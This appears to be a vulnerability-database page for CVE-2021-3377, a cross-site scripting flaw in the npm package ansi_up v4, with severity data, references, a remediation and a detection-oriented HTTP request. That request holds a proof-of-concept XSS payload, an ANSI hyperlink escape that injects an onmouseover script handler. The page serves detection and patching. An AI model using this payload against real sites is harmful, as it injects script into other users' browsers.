---
layout: "post"
cve_id: "CVE-2021-3377"
title: "npm ansi_up v4 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-3377.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-3377.yaml"
author: "geeknik"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute malicious scripts in the context of a user's browser, leading to potential data theft or unauthorized actions.
"
remediation: "Upgrade to v5.0.0 or later."
reference:
  - "https://doyensec.com/resources/Doyensec_Advisory_ansi_up4_XSS.pdf"
  - "https://github.com/drudru/ansi_up/commit/c8c726ed1db979bae4f257b7fa41775155ba2e27"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-3377"
  - "https://github.com/ARPSyndicate/kenzer-templates"
  - "https://github.com/ARPSyndicate/cvemon"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 6.1, 'cve-id': 'CVE-2021-3377', 'cwe-id': 'CWE-79', 'epss-score': 0.46141, 'epss-percentile': 0.97537, 'cpe': 'cpe:2.3:a:ansi_up_project:ansi_up:*:*:*:*:*:node.js:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'ansi_up_project', 'product': 'ansi_up', 'framework': 'node.js'}"
tags:
  - "cve2021"
  - "cve"
  - "xss"
  - "npm"
  - "ansi_up_project"
  - "node.js"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
npm package ansi_up v4 is vulnerable to cross-site scripting because ANSI escape codes can be used to create HTML hyperlinks.

## üåê HTTP Request
```nohighlight
GET /\u001B]8;;https://interact.sh"/onmouseover="alert(1)\u0007example\u001B]8;;\u0007 HTTP/1.1
Host: www.victim.com
Connection: close
```

